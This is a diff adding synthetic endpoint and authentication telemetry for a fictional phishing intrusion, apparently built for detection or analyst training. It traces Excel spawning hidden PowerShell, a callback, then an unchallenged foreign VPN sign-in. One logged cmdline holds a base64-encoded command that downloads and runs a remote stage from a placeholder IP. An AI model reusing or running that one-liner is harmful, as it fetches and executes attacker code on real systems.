@@ -1,0 +1,24 @@
+# Bellwood Logistics — endpoint telemetry, SANDRA-KIM-PC (10.20.14.88) + downstream auth
+# events (synthetic training data). Times UTC.
+
+[EDR] 2026-08-10T09:19:55Z host=SANDRA-KIM-PC user=BELLWOOD\sandra.kim
+  event=PROCESS_CREATE parent=EXCEL.EXE (pid 4412) child=POWERSHELL.EXE (pid 5108)
+  cmdline="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUAMgAnACkA"
+  parent_hash=sha256:a1e4c9d2f6b8034e7c1a29d5f3b6e8901c4d7f2a5b8e1c4f7a0d3b6e9c2f5a81
+  severity=high mitre=T1566.001,T1204.002
+
+[EDR] 2026-08-10T09:19:58Z host=SANDRA-KIM-PC user=BELLWOOD\sandra.kim
+  event=NETWORK_CONNECTION process=POWERSHELL.EXE (pid 5108)
+  dst_ip=203.0.113.45 dst_port=443 direction=outbound proto=tcp
+  note="staging callback to the same IP block the phishing message originated from"
+
+[AUTH] 2026-08-10T09:58:20Z service=O365/VPN-SSO user=sandra.kim@bellwoodlogistics.com
+  event=SIGNIN_SUCCESS src_ip=203.0.113.77 src_asn="AS64512 EXAMPLE-HOSTING-BV" geo=Amsterdam-area
+  mfa_challenge=NONE_RECORDED baseline_note="user's last 90 days of sign-ins are 100% from Chicago
+  office egress 198.51.100.20; this is the first non-Chicago sign-in on this account"
+  mitre=T1078
+
+[AUTH] 2026-08-10T09:59:41Z service=vpn.bellwoodlogistics.com (external gateway) user=sandra.kim@bellwoodlogistics.com
+  event=VPN_SESSION_ESTABLISHED src_ip=203.0.113.77 assigned_internal_ip=10.20.14.230
+  internal_hostname_tag=REMOTE-SANDRA mfa_challenge=NONE_RECORDED
+  mitre=T1133
